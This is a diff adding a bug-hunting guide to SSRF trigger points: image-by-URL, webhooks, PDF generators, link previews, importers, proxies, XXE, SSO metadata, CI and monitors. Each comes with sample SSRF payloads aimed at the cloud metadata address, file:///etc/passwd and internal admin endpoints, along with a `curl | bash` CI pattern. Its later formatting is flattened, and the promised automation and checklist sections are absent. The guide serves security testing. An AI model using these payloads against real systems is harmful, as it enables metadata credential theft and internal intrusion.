@@ -1,0 +1,469 @@
+# SSRF Trigger Points: Complete Discovery Guide
+
+> A systematic approach to finding SSRF vulnerabilities by identifying URL-input features.
+
+## Table of Contents
+
+- [The SSRF Hunter's Mindset](#the-ssrf-hunters-mindset)
+- [Primary SSRF Trigger Points](#primary-ssrf-trigger-points)
+- [Testing Methodology](#testing-methodology)
+- [Real-World Examples](#real-world-examples)
+- [Automation Scripts](#automation-scripts)
+- [Quick Reference Checklist](#quick-reference-checklist)
+
+---
+
+## The SSRF Hunter's Mindset
+
+### The Golden Rule
+
+> **Any feature that accepts a URL and fetches its content is a potential SSRF vector.**
+
+### Why These Features Are Vulnerable
+
+| Feature Type | Why Vulnerable | Impact |
+|--------------|----------------|--------|
+| **Image upload by URL** | Server downloads image from user-provided URL | Internal network access |
+| **Webhook configs** | Server sends POST requests to user URL | Internal service interaction |
+| **PDF generators** | Server renders external content | Metadata access, file read |
+| **Link previews** | Server fetches page metadata | Internal page enumeration |
+| **Import/export** | Server fetches data from URL | Data exfiltration |
+
+---
+
+## Primary SSRF Trigger Points
+
+### 1. Image Upload by URL
+
+**The Feature:** Users provide image URL instead of uploading file
+
+**Common Locations:**
+- Profile picture upload
+- Blog post featured images
+- Product image URLs
+- Avatar services (Gravatar, etc.)
+- Rich text editor image insertion
+
+**Real-World Example:**
+```python
+# Vulnerable endpoint
+POST /api/user/avatar HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+    "avatar_url": "https://example.com/photo.jpg"
+}
+
+# Server does:
+# 1. Downloads image from URL
+# 2. Saves to local storage
+# 3. Returns success
+
+# SSRF Test:
+{
+    "avatar_url": "http://169.254.169.254/latest/meta-data/"
+}
+
+
+
+
+
+
+
+How to Find:
+
+    Look for "Upload from URL" button
+
+    Check API documentation for image_url, avatar_url, photo_url parameters
+
+    Test in rich text editors (paste image URL)
+
+2. Webhook Configurations
+
+The Feature: Users configure URLs where server sends POST requests on events
+
+Common Locations:
+
+    Developer settings
+
+    Integration pages
+
+    Notification settings
+
+    API settings
+
+    CI/CD configuration
+
+Real-World Example:
+http
+
+POST /api/webhooks HTTP/1.1
+Host: target.com
+
+{
+    "event": "order.created",
+    "callback_url": "https://my-server.com/webhook"
+}
+
+# Server sends POST to callback_url when event occurs
+
+# SSRF Test:
+{
+    "callback_url": "http://internal-admin:8080/delete-all-users"
+}
+
+How to Find:
+
+    Look for "Webhooks", "Callbacks", "Notifications"
+
+    Check "Integrations" section
+
+    Review API settings pages
+
+    Search for webhook_url, callback, endpoint parameters
+
+3. PDF Generators
+
+The Feature: Generate PDF from user-provided URL or HTML
+
+Common Locations:
+
+    Invoice generation
+
+    Report export
+
+    Receipt printers
+
+    Document converters
+
+    Screenshot services
+
+Real-World Example:
+http
+
+POST /api/generate-pdf HTTP/1.1
+Host: target.com
+
+{
+    "url": "https://example.com/page-to-convert",
+    "format": "A4"
+}
+
+# Server uses headless browser to render URL to PDF
+
+# SSRF Test:
+{
+    "url": "file:///etc/passwd"  # File read
+}
+{
+    "url": "http://169.254.169.254/"  # Metadata
+}
+{
+    "url": "http://localhost:8080/admin"  # Internal service
+}
+
+How to Find:
+
+    Look for "Export to PDF", "Download as PDF"
+
+    Check "Print" or "Generate Report" features
+
+    Test URL parameters like ?url= in PDF endpoints
+
+    Check ?src=, ?source=, ?document= parameters
+
+4. Link Preview / URL Unfurling
+
+The Feature: Shows preview of links shared in messages/comments
+
+Common Locations:
+
+    Chat applications (Slack, Discord, Teams)
+
+    Social media platforms
+
+    Comment sections
+
+    Messaging apps
+
+    CRM systems
+
+Real-World Example:
+http
+
+POST /api/preview HTTP/1.1
+Host: chat-app.com
+
+{
+    "message": "Check this out: https://example.com"
+}
+
+# Server fetches URL to extract:
+# - Title
+# - Description
+# - Open Graph images
+# - Favicon
+
+# SSRF Test:
+{
+    "message": "http://169.254.169.254/latest/meta-data/"
+}
+
+# Response might show metadata info in error!
+
+How to Find:
+
+    Share URLs in chat/comments
+
+    Check network tab for preview requests
+
+    Look for oEmbed, Open Graph, link preview features
+
+    Test URL shorteners that fetch destination
+
+5. Import/Export Tools
+
+The Feature: Import data from external URL or export to user URL
+
+Common Locations:
+
+    Data migration tools
+
+    Backup/restore features
+
+    RSS feed readers
+
+    CSV/JSON importers
+
+    Database sync tools
+
+Real-World Example:
+http
+
+POST /api/import HTTP/1.1
+Host: target.com
+
+{
+    "import_type": "csv",
+    "source_url": "https://my-server.com/data.csv"
+}
+
+# Server downloads and processes file from URL
+
+# SSRF Test:
+{
+    "source_url": "http://internal-db:5432/"
+}
+{
+    "source_url": "http://169.254.169.254/user-data"
+}
+
+How to Find:
+
+    Look for "Import from URL" buttons
+
+    Check "Sync from external source"
+
+    Review "Backup" and "Restore" features
+
+    Test RSS feed URL inputs
+
+6. Proxy/Forwarding Features
+
+The Feature: Proxy requests through the server
+
+Common Locations:
+
+    API gateways
+
+    Web accelerators
+
+    Image proxies
+
+    CORS proxies
+
+    Translation services
+
+Real-World Example:
+http
+
+GET /proxy?url=https://example.com HTTP/1.1
+Host: proxy-service.com
+
+# Server fetches URL and returns content
+
+# SSRF Test:
+GET /proxy?url=http://169.254.169.254/
+
+How to Find:
+
+    Search for ?url= parameter
+
+    Look for ?target=, ?dest=, ?redirect=
+
+    Check /?q= that fetches content
+
+    Review API documentation for "proxy" endpoints
+
+7. XML External Entity (XXE) Related
+
+The Feature: Parses XML with external entities
+
+Common Locations:
+
+    SOAP APIs
+
+    RSS readers
+
+    XML uploads
+
+    SVG uploads
+
+    DOCX/XLSX processing
+
+Real-World Example:
+xml
+
+<!-- Malicious XML -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+
+# If XML parser resolves entities → SSRF
+
+How to Find:
+
+    Upload SVG files (XML-based)
+
+    Use RSS feed URLs
+
+    Test SOAP endpoints
+
+    Upload Office documents
+
+8. Federation & SSO Features
+
+The Feature: Fetch identity provider metadata
+
+Common Locations:
+
+    SAML configuration
+
+    OAuth settings
+
+    OpenID Connect
+
+    LDAP sync
+
+    Social login
+
+Real-World Example:
+http
+
+POST /admin/saml/setup HTTP/1.1
+
+{
+    "idp_metadata_url": "https://identity-provider.com/metadata.xml"
+}
+
+# Server fetches metadata from URL
+
+# SSRF Test:
+{
+    "idp_metadata_url": "http://169.254.169.254/latest/meta-data/"
+}
+
+How to Find:
+
+    Check "Single Sign-On" configuration
+
+    Look for "Identity Provider URL" fields
+
+    Review "Federation" settings
+
+    Test "Metadata URL" inputs
+
+9. CI/CD & Build Systems
+
+The Feature: Fetch artifacts, scripts, or configurations from URLs
+
+Common Locations:
+
+    GitHub Actions
+
+    Jenkins plugins
+
+    GitLab CI
+
+    CircleCI orbs
+
+    Docker builds
+
+Real-World Example:
+yaml
+
+# GitHub Actions workflow
+steps:
+  - name: Download script
+    run: curl -s ${{ secrets.SCRIPT_URL }} | bash
+
+# SSRF if SCRIPT_URL can be controlled
+
+How to Find:
+
+    Review CI configuration files
+
+    Check for url parameters in build scripts
+
+    Test artifact download features
+
+    Look for external resource fetching
+
+10. Monitoring & Health Checks
+
+The Feature: Check endpoint health by making requests
+
+Common Locations:
+
+    Uptime monitors
+
+    Status pages
+
+    Health dashboards
+
+    Alerting systems
+
+    Log aggregators
+
+Real-World Example:
+http
+
+POST /api/monitors HTTP/1.1
+
+{
+    "type": "http",
+    "url": "https://my-service.com/health",
+    "interval": 60
+}
+
+# Server checks URL every 60 seconds
+
+# SSRF Test:
+{
+    "url": "http://internal-service:8080/secret"
+}
+
+How to Find:
+
+    Look for "Uptime Robot" alternatives
+
+    Check "Status Page" configurations
+
+    Review "Alert Webhooks"
+
+    Test "Custom Endpoint" inputs
